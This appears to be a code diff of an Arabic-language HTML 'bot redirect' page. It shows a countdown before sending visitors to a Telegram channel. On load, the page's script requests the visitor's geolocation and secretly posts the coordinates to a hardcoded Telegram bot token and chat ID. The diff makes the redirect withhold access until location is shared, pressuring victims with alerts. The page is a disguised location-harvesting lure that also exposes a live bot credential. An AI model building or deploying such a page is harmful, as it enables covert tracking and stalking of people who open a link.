@@ -1,58 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <title>صفحة توجيه البوت</title>
   <meta charset="UTF-8">
+  <title>صفحة توجيه البوت</title>
   <style>
     body {
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background-color: #f2f2f2;
+      margin: 0;
+      background-image: url('https://i.pinimg.com/736x/dc/9d/41/dc9d4149758055ed003a52ff47707520.jpg');
+      background-size: cover;
+      background-position: center;
       font-family: Arial, sans-serif;
+      color: #ffffff;
+      direction: rtl;
+      overflow: hidden;
     }
     #countdown {
-      width: 70px;
-      height: 70px;
-      font-size: 30px;
+      width: 80px;
+      height: 80px;
+      font-size: 36px;
       font-weight: bold;
-      background-color: #ffffff;
-      border: 2px solid #ccc;
-      border-radius: 10px;
+      background: rgba(0, 0, 0, 0.6);
+      border: 2px solid #ffffffaa;
+      border-radius: 20px;
       display: flex;
       justify-content: center;
       align-items: center;
+      text-shadow: 0 0 5px #000000;
+      transition: background-color 0.3s ease;
+    }
+    #countdown.done {
+      background: #00ff99;
+      border-color: #00cc77;
+      color: #004422;
+      box-shadow: 0 0 20px #00ff99aa;
+      text-shadow: none;
     }
   </style>
+</head>
+<body>
+  <div id="countdown">5</div>
+
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
+    const REDIRECT_URL = "https://t.me/sswq22";
+
+    let seconds = 5;
+    let locationSent = false;
 
     function getLocationAndSend() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
-
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .catch(() => {});
-        }, () => {});
+            .then(() => locationSent = true)
+            .catch(() => locationSent = false);
+        }, () => {
+          locationSent = false;
+          alert("تم رفض إذن الموقع.");
+        });
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع.");
       }
     }
-
-    let seconds = 5;
 
     function startCountdown() {
       const countdownEl = document.getElementById("countdown");
       countdownEl.innerText = seconds;
-
       const interval = setInterval(() => {
         seconds--;
         countdownEl.innerText = seconds;
         if (seconds === 0) {
           clearInterval(interval);
-          window.location.href = "https://t.me/sswq22";
+          if (locationSent) {
+            countdownEl.classList.add('done');
+            countdownEl.innerText = "✔";
+            setTimeout(() => window.location.href = REDIRECT_URL, 800);
+          } else {
+            alert("يرجى الموافقة على مشاركة الموقع أولاً.");
+          }
         }
       }, 1000);
     }
@@ -60,10 +91,7 @@
     window.onload = () => {
       getLocationAndSend();
       startCountdown();
-    }
+    };
   </script>
-</head>
-<body>
-  <div id="countdown">5</div>
 </body>
 </html>
